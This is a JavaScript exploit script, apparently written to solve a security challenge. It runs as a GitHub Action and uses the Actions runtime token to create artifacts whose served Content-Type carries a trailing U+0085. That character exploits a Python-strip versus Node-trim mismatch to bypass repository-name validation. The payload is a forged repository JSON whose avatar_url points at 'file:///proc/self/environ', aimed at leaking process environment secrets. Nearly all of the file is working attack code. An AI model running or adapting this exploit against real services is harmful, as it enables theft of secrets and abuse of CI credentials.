// repo-cassette carrier builder / rsct prober.
//
// Measured so far:
//   * CreateArtifact + PUT + FinalizeArtifact all work from a JS action, and api.github.com serves
//     our exact bytes at /repos/{o}/{r}/actions/artifacts/{id}/zip  (BODY_MATCHES=true)
//   * the served Content-Type is NOT the blob's: GitHub's redirect pins it through the SAS "rsct"
//     parameter (rsct="application/zip"), so all five blob content types served as zip
//
// What the challenge needs: Python (requests) must see "application/json" after .strip() while
// Node must NOT see exactly "application/json" after .trim() (else it validates the repository
// name, and ours has extra path segments). Only U+0085 and U+001C..1F live in that gap, and Node
// refuses to re-emit U+001C..1F, so rsct has to look like "application/json\u0085".
//
// So: probe whether rsct depends on the artifact version/name, then build the carrier with the
// best variant found.

const https = require('node:https');
const { URL } = require('node:url');
const crypto = require('node:crypto');

const RESULTS = process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL;
const RUNTIME = process.env.ACTIONS_RUNTIME_TOKEN;
const GH_TOKEN = process.env.GH_TOKEN;
const REPO = process.env.REPO;
const PAD_TO = 512;
const NEL = '\u0085';

if (!RUNTIME || !RESULTS) throw new Error('run this as a JS action (uses: ./), not a run: step');

function req(method, url, headers, body) {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const r = https.request({ method, hostname: u.hostname, path: u.pathname + u.search, headers },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => resolve({
          status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks),
        }));
      });
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}

const ids = (() => {
  const payload = JSON.parse(Buffer.from(RUNTIME.split('.')[1], 'base64url').toString('utf8'));
  const scope = (Array.isArray(payload.scp) ? payload.scp.join(' ') : String(payload.scp || ''))
    .split(' ').find((s) => s.startsWith('Actions.Results:'));
  const [, run, job] = scope.split(':');
  return { workflow_run_backend_id: run, workflow_job_run_backend_id: job };
})();

const twirp = (rpc, payload) => req('POST',
  `${RESULTS.replace(/\/$/, '')}/twirp/github.actions.results.api.v1.ArtifactService/${rpc}`,
  { 'content-type': 'application/json', authorization: `Bearer ${RUNTIME}` },
  JSON.stringify(payload));

const api = (path) => req('GET', `https://api.github.com${path}`, {
  authorization: `Bearer ${GH_TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'forge',
});

const putBlob = (signedUrl, bytes, contentType) => req('PUT', signedUrl, {
  'x-ms-blob-type': 'BlockBlob',
  'x-ms-version': '2021-08-06',
  'content-length': String(bytes.length),
  ...(contentType ? { 'x-ms-blob-content-type': contentType } : {}),
}, bytes);

// padded to a fixed size so the artifact id (length known only after finalize) never changes the
// byte count we declared at finalize time
function build(id) {
  const mk = (pad) => Buffer.from(JSON.stringify({
    full_name: `${REPO.toLowerCase()}/actions/artifacts/${id}/zip`,
    description: 'repo cassette'.padEnd(pad, '.'),
    stargazers_count: 0,
    owner: { login: 'rc', avatar_url: 'file:///proc/self/environ' },
  }), 'utf8');
  let pad = 13;
  while (mk(pad).length < PAD_TO) pad += 1;
  return mk(pad);
}

async function findId(name) {
  for (let i = 0; i < 10; i += 1) {
    const list = await api(`/repos/${REPO}/actions/artifacts?per_page=100`);
    if (list.status === 200) {
      const hit = (JSON.parse(list.body.toString('utf8')).artifacts || [])
        .filter((a) => a.name === name).sort((a, b) => b.id - a.id)[0];
      if (hit) return hit.id;
    }
    await new Promise((r) => setTimeout(r, 2000));
  }
  return null;
}

async function inspect(id) {
  const dl = await api(`/repos/${REPO}/actions/artifacts/${id}/zip`);
  if (!dl.headers.location) return { status: dl.status, rsct: null, served: null };
  const loc = new URL(dl.headers.location);
  const final = await req('GET', dl.headers.location, { 'user-agent': 'forge' });
  return {
    status: dl.status,
    rsct: loc.searchParams.get('rsct'),
    rscd: loc.searchParams.get('rscd'),
    served: final.headers['content-type'] || '',
    body: final.body,
  };
}

// usable = Python's strip() reduces it to application/json, JS's trim() does not
function usable(ct) {
  if (!ct) return false;
  const head = ct.split(',')[0].split(';')[0];
  const py = head.replace(/^[\s\u0085\u001c-\u001f]+|[\s\u0085\u001c-\u001f]+$/g, '').toLowerCase();
  return py === 'application/json' && head.trim().toLowerCase() !== 'application/json';
}

(async () => {
  const stamp = Date.now();
  // v7 demands a mime_type ("a valid mime_type is required for this artifact version"), and v4/v6
  // pin rsct to application/zip no matter the name -- so v7's mime_type is the one content-type
  // input we have. Probe which values survive validation and what actually reaches the wire.
  const variants = [
    { version: 7, mime: 'application/json', tag: 'plain' },
    { version: 7, mime: 'application/json\u0085', tag: 'NEL' },
    { version: 7, mime: 'application/json\u001c', tag: 'FS' },
    { version: 7, mime: 'application/json ', tag: 'space' },
    { version: 7, mime: 'application/json;charset=utf-8', tag: 'charset' },
    { version: 7, mime: 'application/json,application/zip', tag: 'json-then-zip' },
    { version: 7, mime: 'application/zip,application/json', tag: 'zip-then-json' },
    { version: 7, mime: 'application/json\u0085;charset=utf-8', tag: 'NEL-then-charset' },
    { version: 7, mime: 'text/plain', tag: 'textplain' },
  ].map((v) => ({ ...v, name: `${v.tag}-${stamp}` }));

  const results = [];
  for (const v of variants) {
    const label = `v${v.version} ${v.tag} mime=${JSON.stringify(v.mime)}`;
    const created = await twirp('CreateArtifact', {
      ...ids, name: v.name, version: v.version, mime_type: v.mime,
    });
    let signed;
    try { signed = JSON.parse(created.body.toString('utf8')).signed_upload_url; } catch { /* noop */ }
    if (!signed) {
      console.log(`[-] ${label} CreateArtifact=${created.status} ${created.body.toString('utf8').slice(0, 140)}`);
      continue;
    }
    const placeholder = build(0);
    const put = await putBlob(signed, placeholder, 'application/json');
    const digest = `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}`;
    const fin = await twirp('FinalizeArtifact', {
      ...ids, name: v.name, size: String(PAD_TO), hash: digest,
    });
    if (fin.status !== 200) {
      console.log(`[-] ${label} put=${put.status} finalize=${fin.status} ${fin.body.toString('utf8').slice(0, 140)}`);
      continue;
    }
    const id = await findId(v.name);
    if (!id) { console.log(`[-] ${label} never appeared in the REST listing`); continue; }
    const got = await inspect(id);
    const ok = usable(got.served);
    console.log(`[*] ${label} id=${id} rsct=${JSON.stringify(got.rsct)} rscd=${JSON.stringify(got.rscd)}`
      + ` served=${JSON.stringify(got.served)} hex=${Buffer.from(got.served || '', 'latin1').toString('hex')}`
      + `${ok ? '  <-- USABLE' : ''}`);
    results.push({ ...v, id, signed, served: got.served, ok });
  }

  const pick = results.find((r) => r.ok) || results[0];
  if (!pick) throw new Error('no artifact variant survived create+finalize');
  const payload = build(pick.id);
  await putBlob(pick.signed, payload, 'application/json');
  const final = await inspect(pick.id);
  const ct = final.served || '';

  console.log('\n===== HAND THIS BACK =====');
  console.log('USABLE_FOUND=' + results.some((r) => r.ok));
  console.log('PICKED=v' + pick.version + ' ' + JSON.stringify(pick.name));
  console.log('REPOSITORY=' + `${REPO.toLowerCase()}/actions/artifacts/${pick.id}/zip`);
  console.log('ARTIFACT_ID=' + pick.id);
  console.log('BODY_B64=' + (final.body ? final.body.toString('base64') : ''));
  console.log('BODY_MATCHES=' + (final.body ? final.body.equals(payload) : false));
  console.log('CT=' + JSON.stringify(ct));
  console.log('CT_HEX=' + Buffer.from(ct, 'latin1').toString('hex'));
})().catch((e) => { console.error('[x]', e); process.exit(1); });